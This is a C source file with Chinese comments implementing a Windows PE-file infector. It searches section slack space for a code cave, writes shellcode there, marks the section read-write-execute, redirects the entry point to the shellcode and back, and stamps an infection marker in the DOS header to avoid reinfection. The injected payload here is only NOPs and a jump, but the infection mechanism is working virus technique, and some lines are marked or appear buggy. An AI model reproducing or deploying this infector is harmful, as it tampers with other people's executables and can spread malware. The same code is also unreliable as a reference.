#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
/*
	向PE文件中插入代码有两种常用方式:
		1. 添加一个节区
		2. 缝隙查找,即向空闲空间中插入代码
	以上两种方式插入代码之后都需要更改PE文件中部分关键字段.
	缝隙查找原理:
		节的长度是按照IMAGE_OPTIONAL_HEADER中的FileAlignment字段对齐的,
		实际每个节的长度不一定刚好与对齐后的长度相等.
		这样在每个节与节之间,必然有没有用到的空间,这个空间就叫缝隙.
		只要确定要写入代码的长度,然后根据这个长度来查找是否有满足该长度的缝隙就可以了.
	感染目标程序文件实现:
		1. 把代码添加到目标文件中
			遍历每个节以寻找足够容纳病毒代码的缝隙,将代码插入到该缝隙中,
			同时修改该节的属性,以提供该节可执行权限.默认只有代码节有可执行权限.
		2. 把代码添加到了目标文件中,但是这些如何才能被执行呢?
			这就要修改目标可执行文件的入口地址.
			修改目标入口地址后,让其先来执行自己的代码,然后跳转到原来程序的入口处继续执行.
	防止重复感染:
		为了避免重复感染目标程序,必须对目标程序写入感染标志,以防止二次感染,导致目标程序无法执行.
		每次在对程序进行感染时都要先判断是否有感染标志,如果有感染标志,则不进行感染;如果没有感染标志,则进行感染.
		PE文件结构中有非常多不实用的字段,可以找一个合适的位置写入感染标志.
		此处选择写入到IMAGE_DOS_HEADER中的e_cblp位置.
		因为IMAGE_DOS_HEADER中除了e_magic和e_lfanew两个字段外,其余都是没什么用的,可以放心写入.
	offsetof(Struct,Member) 宏介绍:
		该宏的作用是取得某字段在结构体中的领衔.对于IMAG_DOS_HEADER结构体中的e_cblp来说,它在结构体中的偏移是2.
		那么offsetof(IMAGE_DOS_HEADER, e_cblp)返回的值则是2.
*/
DWORD findSpace(int sectionIndex, LPVOID lpBase, PIMAGE_NT_HEADERS pNtHeader);
void release();
BOOL isPeFileAndGetPointer();
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);

#define SIGNATURE 0xFF

char shellCode[] = "\x90\x90\x90\x90\xb8\x90\x90\x90\x90\xff\xe0\x00";
// 文件句柄
HANDLE hFile = NULL;
// 映像句柄
HANDLE hMap = NULL;
// 映像视图指针
LPVOID lpBase = NULL;
// DOS头
PIMAGE_DOS_HEADER pDosHeader = NULL;
// PE头
PIMAGE_NT_HEADERS pNtHeader = NULL;
// 节表头
PIMAGE_SECTION_HEADER pSectionHeaders = NULL;
// 节表头结构体
IMAGE_SECTION_HEADER imgSection = { 0 };

void main2() {

	char filePath[MAX_PATH] = { 0 };
	printf("输入文件路径:\n");
	scanf("%s", filePath);

	hFile = CreateFile(filePath, 
		GENERIC_WRITE | GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
	lpBase = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

	BOOL bResult = isPeFileAndGetPointer();
	if (bResult == TRUE)
	{
		// 判断是否已经被感染过了
		bResult = readSignature(hFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
		if (bResult == TRUE)
		{
			printf("已经被感染过,退出感染!\n");
		}
		else
		{
			int numberOfSection = pNtHeader->FileHeader.NumberOfSections;
			/* 
				加入循环查找所有节表,由于代码插入到代码节没有执行权限.
				所以需要手动将该节的属性设置为0xE0000060(可读,可写,可执行,包含代码,包含初始化数据)
			*/
			for (int i = 0; i < numberOfSection; i++)
			{
				// 用于插入代码的缝隙地址
				DWORD dwGapAddress = findSpace(i, lpBase, pNtHeader);
				if (dwGapAddress != 0)
				{
					// 将原入口地址写入插入的代码中,以便跳转回原程序
					DWORD dwEp = pNtHeader->OptionalHeader.ImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
					*(DWORD*)&shellCode[5] = dwEp;

					// +3 ???
					memcpy((char*)dwGapAddress,shellCode,strlen(shellCode) + 3);
	
					// 由于内存对齐不一致,需要从FOA转换为RVA,再指定为新的入口地址
					dwGapAddress = pSectionHeaders[i].PointerToRawData + dwGapAddress - (DWORD)(BYTE *)lpBase;
					pNtHeader->OptionalHeader.AddressOfEntryPoint = dwGapAddress;

					// 写入感染标志
					BOOL flag = writeSignature(hFile, offsetof(IMAGE_DOS_HEADER, e_cblp),SIGNATURE);
					if (flag == FALSE)
					{
						printf("写入感染标记失败!\n");
					}
					printf("代码插入到%s节中!\n", pSectionHeaders[i].Name);
					printf("已修改该节的权限为0xE0000060.\n");
					printf("原入口地址FOA:%X\n", dwEp);
					printf("新入口地址FOA:%X\n", dwGapAddress);
					break;
				}
			}
		}
	}
	release();
	system("pause");
}

/*
	缝隙搜索
	在代码节和紧挨代码节之后的节的中间搜索缝隙,搜索的方向是从代码节的末尾开始(反方向的搜索速度可能会快一些).
	该代码可能会找到缝隙,可能会找不到,因此在调用完之后需要做一些判断,以应变各种不同的情况
*/
DWORD findSpace(int sectionIndex, LPVOID lpBase, PIMAGE_NT_HEADERS pNtHeader) {
	pSectionHeaders = (PIMAGE_SECTION_HEADER)
		((BYTE*)&pNtHeader->OptionalHeader + pNtHeader->FileHeader.SizeOfOptionalHeader);
	// 将指针移到代码节的末尾,再往回移动shellCode的长度,以便留出存放shellCode的空间
	DWORD dwAddress = pSectionHeaders[sectionIndex].PointerToRawData +
		pSectionHeaders[sectionIndex].SizeOfRawData - sizeof(shellCode);
	// 
	dwAddress = (DWORD)(BYTE*)lpBase + dwAddress;
	// 初始化一段空间 
	LPVOID lpCode = malloc(sizeof(shellCode));
	memset(lpCode, 0, sizeof(shellCode));
	// 从后向前在该节的对齐空间中反向搜索缝隙地址(即在该节中寻找一片指定长度且为0的空余空间),直到该节中的内容空间.
	DWORD endAddress = (DWORD)(BYTE*)lpBase + pSectionHeaders[sectionIndex].PointerToRawData 
		+ pSectionHeaders[sectionIndex].Misc.VirtualSize;
	while (dwAddress > endAddress)
	{
		int nResult = memcmp((LPVOID)dwAddress, lpCode, sizeof(shellCode));
		if (nResult == 0)
		{
			// 设置该节的属性为0xE0000060,以拥有可执行权限
			pSectionHeaders[sectionIndex].Characteristics = 0xE0000060;
			return dwAddress;
		}
		dwAddress--;
	}
	free(lpCode);
	return 0;
}

/*
	判断是否为有效的PE文件
	如果无效直接返回
	如果有效则把解析PE格式相关的结构体指针也得到
*/
BOOL isPeFileAndGetPointer() {
	BOOL bResult = FALSE;
	// 判断是否为MZ头
	pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("不符合DOS头\n");
		release();
		return bResult;
	}
	// 根据IMAGE_DOS_HEADER中的e_lfanew的值得到PE头的位置
	pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pDosHeader->e_lfanew);
	// 判断是否为PE\0\0
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("不符合PE头\n");
		release();
		return bResult;
	}
	// 获取节表的位置,从NT_HEADER中的&(pNtHeader->OptionalHeader)处加上SizeOfOptionalHeader就是节表的位置了
	// &(pNtHeader->OptionalHeader):取出OptionalHeader在该文件中的偏移地址
	pSectionHeaders = (PIMAGE_SECTION_HEADER)((DWORD)&(pNtHeader->OptionalHeader)
		+ pNtHeader->FileHeader.SizeOfOptionalHeader);
	bResult = TRUE;
	return bResult;
}

/*
	在指定文件的指定位置上写入感染标志
*/
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	return WriteFile(hFile, &dwSignature, sizeof(DWORD), &dwNumber, NULL);
}
/*
	读取指定文件指定位置上的感染标志
*/
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD signatureToRead = 0;
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	ReadFile(hFile, &signatureToRead, sizeof(DWORD), &dwNumber, NULL);
	return signatureToRead == dwSignature;
}

void release() {
	UnmapViewOfFile(lpBase);
	CloseHandle(hMap);
	CloseHandle(hFile);
}